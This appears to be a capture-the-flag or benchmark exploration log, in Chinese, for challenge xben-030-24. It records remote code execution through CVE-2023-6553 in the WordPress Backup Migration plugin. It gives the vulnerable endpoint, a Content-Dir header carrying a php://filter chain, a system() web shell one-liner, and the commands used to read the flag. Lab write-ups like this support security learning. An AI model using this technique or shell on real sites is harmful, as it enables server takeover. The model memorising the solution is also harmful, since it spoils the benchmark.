# xben-030-24 · 探索记录

对应题解：[`xben-030-24.md`](./xben-030-24.md)

## 目标与起点

`10.0.175.48:80`，WordPress 6.5.4，首页标题 `RCE`。

## 第一阶段：识别产品与插件

| 探测 | 结果 |
| --- | --- |
| 首页 generator | `WordPress 6.5.4` |
| `/wp-content/plugins/backup-backup/readme.txt` | 200，`Stable tag: 1.3.5` |
| 其它常见插件 readme | 全 404（只有 backup-backup 与 akismet） |
| `/?rest_route=/wp/v2/users` | `wordpress_admin` |
| `/?rest_route=/wp/v2/media` | 5 个附件（含 `canto.3.0.4.zip`，属于 034） |

→ Backup Migration 1.3.5 对应 **CVE-2023-6553**。

## 第二阶段：确认入口文件

`POST /wp-content/plugins/backup-backup/includes/backup-heart.php` → 200，0 字节，
说明它走到了 `require_once BMI_INCLUDES . '/bypasser.php'` 且没有致命错误。

`Content-Dir` 会被拼成 `BMI_ROOT_DIR`，因此这里就是 include 目标的控制点。

## 第三阶段：拿到正确姿势（本轮突破）

失败过的方向：

| 尝试 | 结果 | 判据 |
| --- | --- | --- |
| `Content-Dir: data://text/plain,<?=...?>` | 无文件生成 | 500/0 字节，`allow_url_include=Off` |
| `Content-Configdir` 指到 web 目录写 `error_log` | 5 个目录都 404 | docroot 实际可写但 error_log 未落盘（log_errors 关闭） |
| `php_filter_chain` + `<?=copy('/flag.txt','q');?>` | 文件 404 | **路径猜错**，flag 在 `/opt/flag.txt` |
| 同上，请求体是二进制乱码 | 误判为「链不可用」 | 其实那是执行后的 iconv 尾巴 |

决定性测试：

```text
Content-Dir: php://filter/<chain for <?php echo "MARKER123"; ?> >/resource=php://temp
POST 后响应体 → "MARKER123" + 二进制尾巴
```

出现 MARKER 就证明 include 执行成功。随后把 payload 缩短为
`<?=system($_GET[0]);?>`（头长度限制 8KB），命令走 query：

| 命令 | 输出 |
| --- | --- |
| `id` | `uid=33(www-data)` |
| `ls -la /opt` | `flag.txt`（42 字节） |
| `cat /opt/flag.txt` | **flag** |

## 这次真正的收获

1. **先做「MARKER 定性」，再谈利用。** 二进制尾巴不是失败信号，include 成功才会带出来。
2. **请求头长度上限（Apache 8190 字节）是 filter chain 的硬约束**，
   用 `$_GET`/`$_POST` 外置命令即可绕开。
3. flag 路径不要猜（`/flag`、`/challenge/flag.txt` 都没有），拿到 RCE 后先 `ls /` 和 `find`。
